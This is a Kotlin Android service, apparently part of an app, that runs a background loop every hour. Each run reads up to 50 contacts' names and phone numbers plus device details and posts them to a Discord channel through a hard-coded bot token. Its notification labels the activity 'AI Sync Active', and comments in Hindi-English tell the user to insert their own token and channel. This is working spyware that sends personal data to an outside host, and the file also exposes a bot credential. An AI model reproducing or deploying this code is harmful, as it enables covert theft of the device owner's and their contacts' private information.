package com.example.myapp

import android.app.Notification
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit

class DataCollectorService : Service() {

    private val gson = Gson()
    // YAHAN APNA DISCORD BOT TOKEN DAALO
    private val BOT_TOKEN = "MTU0Mjg0ODQzODUyMDI1ODY0MQ.Gzvr9s.9ZUj_nswbq2T8B0JyBdjgLF1b6l4WYHstbOmt4" 
    // YAHAN APNA CHANNEL ID DAALO
    private val CHANNEL_ID = "1542844624136314924"

    private val TAG = "DataCollectorService"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        val notification = NotificationCompat.Builder(this, "SYNC_CHANNEL")
            .setContentTitle("AI Sync Active")
            .setContentText("Collecting data in background...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
        startForeground(1, notification)
        
        // Start Background Loop
        Thread {
            while (true) {
                try {
                    collectData()
                    Thread.sleep(3600000) // 1 Hour wait
                } catch (e: Exception) {
                    Log.e(TAG, "Error: ${e.message}")
                }
            }
        }.start()
    }

    private fun collectData() {
        val data = mutableMapOf<String, Any>()
        
        // 1. Contacts
        data["contacts"] = getContacts()
        
        // 2. Device Info
        data["device"] = mapOf(
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "os" to Build.VERSION.RELEASE
        )

        // Convert to JSON String
        val jsonData = gson.toJson(data)
        uploadToDiscord(jsonData)
    }

    private fun getContacts(): List<Map<String, String>> {
        val contacts = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            val nameIdx = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
            
            while (it.moveToNext()) {
                val name = it.getString(nameIdx)
                val number = it.getString(numIdx)
                if (!name.isNullOrEmpty() && !number.isNullOrEmpty()) {
                    contacts.add(mapOf("name" to name, "number" to number))
                }
            }
        }
        return contacts.take(50) // Limit to 50 for speed
    }

    private fun uploadToDiscord(jsonData: String) {
        val url = "https://discord.com/api/v9/channels/$CHANNEL_ID/messages"
        val body = mapOf("content" to jsonData)
        val jsonBody = gson.toJson(body).toRequestBody("application/json; charset=utf-8".toMediaType())

        val request = Request.Builder()
            .url(url)
            .header("Authorization", "Bot $BOT_TOKEN")
            .post(jsonBody)
            .build()

        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Upload Failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Upload Success: ${response.code}")
                response.close()
            }
        })
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
}